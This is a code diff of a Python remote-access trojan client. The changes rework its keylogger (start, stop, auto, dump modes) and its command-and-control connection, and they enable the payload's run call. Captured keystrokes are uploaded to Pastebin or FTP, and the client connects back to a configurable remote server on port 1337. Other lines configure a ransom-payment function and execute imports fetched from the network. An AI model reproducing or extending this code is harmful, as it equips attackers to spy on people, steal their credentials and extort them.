@@ -414,19 +414,14 @@ class Client(object):
     @config(api_key=None, endpoint=None)
     def _get_remote_server():
         try:
-            url = Client._get_user_config(endpoint)
-            if url.startswith('http'):
-                req = urllib2.Request(url)
-                api = Client._get_user_config(api_key)
-                req.headers = {'API-Key': api}
-                res = json.loads(urllib2.urlopen(req).read())
-                ip  = res[res.keys()[0]][0].get('ip')
-                if Client._get_if_ipv4(ip):
-                    return ip
-                else:
-                    Client.debug("{} returned invalid IPv4 address: '{}'".format(Client._get_remote_server.func_name, str(ip)))
+            req = urllib2.Request(Client._get_remote_server.endpoint)
+            req.headers = {'API-Key': Client._get_remote_server.api_key}
+            res = json.loads(urllib2.urlopen(req).read())
+            ip  = res[res.keys()[0]][0].get('ip')
+            if Client._get_if_ipv4(ip):
+                return ip
             else:
-                Client.debug("Error: invalid API endpoint: '{}'".format(str(endpoint)))
+                Client.debug("{} returned invalid IPv4 address: '{}'".format(Client._get_remote_server.func_name, str(ip)))
         except Exception as e:
             Client.debug("{} error: {}".format(Client._get_remote_server.func_name, str(e)))
         return socket.gethostbyname(socket.gethostname())
@@ -697,6 +692,13 @@ class Client(object):
                 self.debug('{} error: {}'.format(self._keylogger.func_name, str(e)))
                 break
 
+
+    def _keylogger_status(self,  *args, **kwargs):
+        try:
+            return "Keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(self.keylogger.mode, self._get_job_status(float(self._jobs['keylogger'].name)), self.keylogger.buffer.tell())
+        except Exception as e:
+            self.debug('{} error: {}'.format(self._keylogger_status.func_name, str(e)))
+    
 
     def _keylogger_manager(self, *args, **kwargs):
         while True:
@@ -1416,10 +1418,9 @@ class Client(object):
             self.debug("{} error: {}".format(self._server_prompt.func_name, str(e)))
             
  
-    def _server_connect(self, host='127.0.0.1', port=1337):
+    def _server_connect(self, port=1337):
         try:
-            if not Client._debug:
-                host = self._get_remote_server()
+            host = self._get_remote_server()
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5.0)
             s.connect((host, port))
@@ -2165,7 +2166,7 @@ class Client(object):
             return "File '{}' not found".format(str(path))
 
 
-    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
+    @config(platforms=['win32','linux2','darwin'], mode='stop', max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
     def keylogger(self, mode=None):
         """
         start/stop/dump the keylogger
@@ -2175,21 +2176,17 @@ class Client(object):
                 return self.keylogger.usage
             else:
                 return self._get_job_status(self._jobs[self.keylogger.func_name].name)
-
         else:
             if 'start' in mode:
                 if self.keylogger.func_name not in self._jobs:
                     self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                     self._jobs[self.keylogger.func_name].setDaemon(True)
                     self._jobs[self.keylogger.func_name].start()
-                    self._jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
-                    self._jobs[self._keylogger_manager.func_name].setDaemon(True)
-                    self._jobs[self._keylogger_manager.func_name].start()
-                    return "Keylogger running"
+                    self.keylogger.mode = mode
+                    return self._keylogger_status()
                 else:
-                    t1 = float(time.time()) - float(self._jobs[self.keylogger.func_name].name)
-                    t2 = float(time.time()) - float(self._jobs[self._keylogger_manager.func_name].name)
-                    return "Keylogger running: {}".format(self._get_job_status(max(t1, t2)))
+                    self.keylogger.mode = mode
+                    return self._keylogger_status()
             elif 'stop' in mode:
                 try:
                     self.stop(self.keylogger.func_name)
@@ -2197,9 +2194,16 @@ class Client(object):
                 try:
                     self.stop(self._keylogger_manager.func_name)
                 except: pass
-                return "Keylogger stopped"
+                self.keylogger.mode = mode
+                return self._keylogger_status()
+            elif 'auto' in mode:
+                self._jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
+                self._jobs[self._keylogger_manager.func_name].setDaemon(True)
+                self._jobs[self._keylogger_manager.func_name].start()
+                self.keylogger.mode = mode
+                return self._keylogger_status()
             elif 'dump' in mode:
-                result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in action else self._upload_ftp(self.keylogger.buffer)
+                result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in mode else self._upload_ftp(self.keylogger.buffer)
                 self.keylogger.buffer.reset()
                 return result
             else:
@@ -2390,7 +2394,7 @@ class Client(object):
 
 def main(*args, **kwargs):
     try:
-        if '--debug' in sys.argv or 1:
+        if '--debug' in sys.argv:
             Client._debug = True
             Client.debug("Debugging: enabled")
         if 'f' not in kwargs and '__file__' in globals():
@@ -2399,7 +2403,15 @@ def main(*args, **kwargs):
             exec "import urllib" in globals()
             w = kwargs.get('w')
             imports = Client._get_user_config(w)
-            exec imports in globals()           
+            exec imports in globals()
+        if 'a' in kwargs:
+            a   = kwargs.get('a')
+            url = Client._get_user_config(a)
+            Client._get_new_option('_get_remote_server', endpoint=url)
+        if 'b' in kwargs:
+            b   =  kwargs.get('b')
+            api = Client._get_user_config(b)
+            Client._get_new_option('_get_remote_server', api_key=api)
         if 'v' in kwargs:
             v = kwargs.get('v')
             Client._report = Client._get_user_config(v).splitlines()
@@ -2421,7 +2433,7 @@ def main(*args, **kwargs):
             Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version, target_url=ransom_target_url)
     finally:
         payload = Client(**kwargs)
-        #payload.run()
+        payload.run()
         return payload
 
 
